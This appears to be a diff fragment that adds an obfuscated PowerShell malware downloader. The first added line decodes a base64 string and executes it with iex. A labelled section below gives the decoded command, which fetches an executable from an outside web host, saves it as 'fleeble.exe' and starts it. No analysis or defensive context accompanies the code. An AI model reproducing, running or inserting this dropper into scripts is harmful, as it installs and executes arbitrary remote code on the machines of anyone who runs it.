@@ -1,0 +1,7 @@
+iex([sysTEM.tEXt.EncoDinG]::uTF8.getSTrINg([SystEm.CoNVert]::frOMbASE64StrInG('CihOZXctT2JqZWN0IHN5U3RlTS5ORVQud0VCY2xJRW50KS5kb3duTG9BREZpbGUoJ2h0dHA6Ly9kYW5odmlldC5jb20udm4vei92L2RvYy5leGUnLCdmbGVlYmxlLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2ZsZWVibGUuZXhlJwoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sySteM.NET.wEBclIEnt).downLoADFile('http://danhviet.com.vn/z/v/doc.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
